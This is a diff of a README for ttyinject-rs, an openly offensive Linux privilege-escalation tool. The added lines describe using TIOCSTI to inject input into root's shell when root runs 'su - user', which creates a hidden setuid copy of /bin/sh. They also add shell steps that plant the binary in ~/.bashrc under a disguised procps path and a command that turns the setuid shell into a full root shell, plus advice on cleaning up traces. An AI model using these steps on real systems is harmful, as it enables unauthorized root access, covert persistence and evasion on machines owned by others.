@@ -15,46 +15,28 @@ A port of [@hackerschoice](https://github.com/hackerschoice)'s [ttyinject](https
 
 ![](https://raw.githubusercontent.com/0xdea/ttyinject-rs/master/.img/bug_vs_feature.jpg)
 
-## Features
+## What it does
 
-- Non-privileged user gets root privileges when root does `su - user`.
+Non-privileged user gets root privileges on Linux when root does `su - user`.
 
 ## How it works
 
 Taken verbatim from [ttyinject](https://github.com/hackerschoice/ttyinject)'s README:
 
 - `su` does not allocate a new TTY when switching to a non-privileged user.
-- The non-privileged user can then use `ioctl(0, TIOCSTI, ...)` to inject input into the root's shell prompt.
-- The injected input copies `/bin/sh` to `/var/tmp/.socket` and +s the same.
+- The non-privileged user can therefore use `ioctl(0, TIOCSTI, ...)` to inject input into the root's shell prompt.
+- The injected input copies `/bin/sh` to `/var/tmp/.socket` and `chmod +s` it.
 - Executes only once (from Alice's `~/.bashrc`). Deletes itself afterwards.
 
 ## See also
 
 - <https://github.com/hackerschoice/ttyinject/>
 
-## Installing
-
-The easiest way to get the latest release is via [crates.io](https://crates.io/crates/ttyinject-rs):
-
-```sh
-cargo install ttyinject-rs
-```
-
-## Compiling
-
-Alternatively, you can build from [source](https://github.com/0xdea/ttyinject-rs):
-
-```sh
-git clone https://github.com/0xdea/ttyinject-rs
-cd ttyinject-rs
-cargo build --release
-```
-
 ## Usage
 
 TODO
 
-Run ttyinject-rs as follows:
+Deploy ttyinject-rs in the user's `~/.bashrc` as follows:
 
 ```sh
 mkdir -p ~/.config/procps 2>/dev/null
@@ -64,7 +46,14 @@ mkdir -p ~/.config/procps 2>/dev/null
 #echo "$(head -n1 ~/.bashrc)"$'\n'"~/.config/procps/reset 2>/dev/null"$'\n'"$(tail -n +2 ~/.bashrc)" >~/.bashrc; fi
 ```
 
-TODO other examples? args?
+Then, wait for root to execute `su - user` and thereafter gain root privileges with:
+
+```sh
+/var/tmp/.socket -p -c "exec python3 -c \"import os;os.setuid(0);os.setgid(0);os.execl('/bin/bash', '-bash')\""
+```
+
+> [!NOTE]
+> The binary will only execute once (and then delete itself), but you still need to clean up `~/.bashrc` and `/var/tmp/.socket`.
 
 ## Compatibility
 
@@ -83,4 +72,4 @@ Tested on Ubuntu Linux 24.04.4 LTS (6.17.0-35-generic #35~24.04.1-Ubuntu kernel)
 
 ## TODO
 
-- TODO
+- Implement arguments (e.g., custom command and number of screen lines to clear) for advanced usage.
